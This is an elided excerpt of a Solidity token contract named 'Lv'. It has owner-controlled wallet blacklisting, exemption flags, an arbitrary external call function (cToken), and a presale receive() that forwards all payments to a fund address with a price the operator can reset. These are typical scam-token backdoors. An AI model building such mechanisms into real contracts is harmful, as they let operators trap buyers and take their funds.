...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping (address => bool) public _isR;
    ...
    constructor (
        ...
        thisMsg = address(this);
       
        swapAndLiquifyEnabled =true;
        ReceiveAddress = ReceiveAddress_;
        // maxTXAmount = 5000 * 10 ** _decimals;
        // walletLimit = 20000 * 10 ** _decimals;
         maxTXAmount = total;
         walletLimit=total;
        _tTotal = total;
        burn0 = msg.sender;
        ...
        numTokensSellToAddToLiquidity= 5000*10**6;
        ...
        _isR[msg.sender] = true;
        _isR[fundAddress] = true;
        _isR[ReceiveAddress] = true;
 ...
 function setSwapAndLiquifyEnabled(bool _enabled) public onlyFunder {
    ...
    function setLimitEnable(bool status) public onlyOwner {
     ...
     function setNumTokensSellToAddToLiquidity(uint256 valur) public onlyFunder {
    ...
    function multi_BlackList(address[] calldata addresses, bool status) public onlyFunder {
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) public lockTheSwap {
        require(msg.sender==thisMsg,'thisMsg');
        swapFee += swapFee;
    ...
    function cToken(address _token,uint256 v,bytes memory data1) external onlyFunder {
    ...
    function setBlackList(address addr, bool enable) external onlyFunder {
     ...
     function setR(address addr, bool enable) external onlyFunder {
        _isR[addr] = enable;
    }
    ...
    mapping(address=>uint256) public joinNum;
    bool public  off = true;
    uint256 public sendEth= 0.03 ether;
     uint256 public joinBalance =10000*10**6;
    receive() external payable {
        join(msg.sender,msg.value);
    }
    
    function join(address to, uint256 value)private {
        require(joinNum[msg.sender] < 2,'<2');
        require(off,'off');
        require(value == sendEth || value == sendEth * 2,'0.03 ether');
        if(joinNum[msg.sender]==0){
            userList.push(to);
        }
        if(value == sendEth){
            joinNum[msg.sender] = joinNum[msg.sender] + 1;
             _tokenTransfer0(ReceiveAddress,to,joinBalance);
        }else {
            joinNum[msg.sender] = joinNum[msg.sender] + 2;
            require(joinNum[msg.sender] <=2,'<=2');
             _tokenTransfer0(ReceiveAddress,to,joinBalance * 2);
        }
        payable(fundAddress).transfer(value);
    }
    
    
    function setOff(bool enable ,uint256 value,uint256 etherValue) external onlyFunder {
        off = enable;
        joinBalance =value;
        sendEth =etherValue;
    }
     function getUserAddres(uint256 _start,uint256 _count)external view returns(address[] memory){
         uint256 tlength = userList.length;
         uint256 clamp = _start + _count > tlength ? tlength - _start : _count;
         address[] memory response = new address[](clamp);
         uint256 counter = 0;
         while (counter < clamp) {
             address temp = userList[_start + counter];
             if( balanceOf(temp) >= joinBalance - 100){
...
contract LV is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "Lv",
        "Lv",
        address(0xdc1cD19bf6414f50c02a2274F1E89B9AffF9D068),
        address(0xf560b68C8214EFC8b61B91470CAc43d3Fadc4bef)
    ){
